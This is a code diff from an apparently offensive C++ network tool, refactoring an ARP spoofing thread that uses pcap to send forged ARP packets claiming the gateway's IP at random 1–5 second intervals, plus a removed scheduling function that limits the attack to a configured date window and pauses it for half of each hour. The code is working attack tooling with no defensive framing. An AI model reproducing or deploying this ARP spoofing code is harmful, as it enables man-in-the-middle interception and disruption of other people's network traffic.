@@ -8,6 +8,7 @@
 #include <algorithm>
 #include <fstream>
 #include "../Flood/Flood/Para.h"
+#include "../Flood/ArpSpoofLib/ArpSpoofLib.h"
 
 int init_info();
 void enum_host();
@@ -56,7 +57,7 @@ DWORD WINAPI ArpSpoofThread(LPVOID lparam)
 	while(!gExit)
 	{
 
-		nRet = TimePolic();
+		nRet = CBase::TimePolic();
 		if(1 == nRet)
 		{
 			break; 
@@ -83,7 +84,7 @@ DWORD WINAPI ArpSpoofThread(LPVOID lparam)
 			pcap_sendpacket(pfp, sendBuffer, 14+28);
 			iter++;
 		}
-		Sleep(CPara::Rand(1, 5) * 1000);//TODO:改成随机[1-5]s
+		Sleep(CBase::Rand(1, 5) * 1000);//TODO:改成随机[1-5]s
 	}
 	pcap_close(pfp);
 }
@@ -378,39 +379,6 @@ void init_host_arp()
 	memcpy(arp.SourceMAC, ethernet.SourMAC, 6);
 	memcpy(arp.DestinationMAC, ethernet.DestMAC, 6);
 	arp.SourceIP = inet_addr(gatewayip.data());
-}
-
-
-//返回值：
-//       1:结束
-//       2:暂时停止发送
-int TimePolic()
-{
-	static CTime tStart = CTime::GetCurrentTime();
-	int nRet = 0;
-
-	std::string szStart = CPara::GetConfigString("section", "s_time", "2013-10-30 13:20:1");
-	std::string szEnd = CPara::GetConfigString("section", "e_time", "2014-10-30 12:59:59");
-	std::vector<std::string> vS, vE;
-	vS = CPara::SplitString(szStart.c_str(), "-: ");
-	vE = CPara::SplitString(szEnd.c_str(), "-: ");
-	CTime tLimit(atoi(vS[0].c_str()),atoi(vS[1].c_str()),atoi(vS[2].c_str()), 0, 0, 0);
-	CTime tLimitEnd(atoi(vE[0].c_str()), atoi(vE[1].c_str()), atoi(vE[2].c_str()), 12, 59, 59);
-	if(!(tStart > tLimit && tStart < tLimitEnd))
-	{
-		printf("未到时间");
-		return 1;
-	}// 结束 if(!(tStart > tLimit && tStart < tLimitEnd))
-
-
-	CTime tCur = CTime::GetCurrentTime();
-	CTimeSpan ts = tCur - tStart;
-	if(ts.GetTotalMinutes() % 60 >= 30 && ts.GetTotalMinutes() % 60 <= 60)
-	{
-		return 2;
-	} // 结束 if(ts.GetTotalMinutes() % 60 >= 30 && ts.GetTotalMinutes() % 60 <= 60)
-
-	return nRet;
 }
 
 unsigned char ConvertToChar(TCHAR * pIn)
